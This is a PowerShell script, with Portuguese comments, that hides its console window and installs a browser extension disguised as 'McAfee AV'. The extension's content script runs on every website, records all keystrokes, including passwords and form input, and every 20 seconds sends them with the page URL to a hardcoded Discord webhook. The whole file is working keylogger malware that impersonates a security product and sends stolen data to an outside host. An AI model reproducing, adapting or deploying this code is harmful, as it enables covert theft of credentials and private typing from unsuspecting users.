$webhook = "https://discord.com/api/webhooks/1374929206877880464/48Gjp9K8Z_jh90Cjw_h8jSMlkHBKHTrhUXsgU64nP4j07_hWbHbaUP9BTEf_ISdUW7I4"

# Ocultar console
$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
$hwnd = (Get-Process -PID $pid).MainWindowHandle
if ($hwnd -ne [System.IntPtr]::Zero) {
    $Type::ShowWindowAsync($hwnd, 0)
}

# Diretório da extensão
$dir = "C:\Users\Public\EdgeKeylogger"
New-Item -ItemType Directory -Path $dir -Force | Out-Null

# main.js
$mainjs = @"
let keys = "";
const current = document.URL;
document.addEventListener("keydown", (event) => {
  const key = event.key;
  if (key === "Enter") { keys += "\n"; return; }
  if (key === "Backspace") { keys = keys.slice(0, keys.length - 1); return; }
  if (key === "CapsLock" || key === "Shift" || key === "Control") return;
  if (key.startsWith("Arrow")) { keys += "[" + key + "]"; return; }
  keys += key;
  localStorage.setItem("keys", keys);
});

setInterval(() => {
  keys = localStorage.getItem("keys");
  if (!keys || keys === "null" || keys.length < 1) return;
  const message = "<" + document.URL + ">\nLogged Keystrokes:\n" + keys;
  chrome.runtime.sendMessage({ msg: message });
  localStorage.setItem("keys", "");
}, 20000);
"@
$mainjs | Out-File "$dir\main.js" -Encoding utf8 -Force

# background.js
$background = @"
const webhook = `"$webhook"`;
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.msg) {
    fetch(webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: request.msg })
    });
  }
});
"@
$background | Out-File "$dir\background.js" -Encoding utf8 -Force

# manifest.json
$manifest = @'
{
  "name": "McAfee AV",
  "description": "Secure browsing powered by McAfee.",
  "version": "2.2",
  "manifest_version": 3,
  "background": {
    "service_worker": "background.js"
  },
  "permissions": ["scripting"],
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["main.js"]
    }
  ]
}
'@
$manifest | Out-File "$dir\manifest.json" -Encoding utf8 -Force
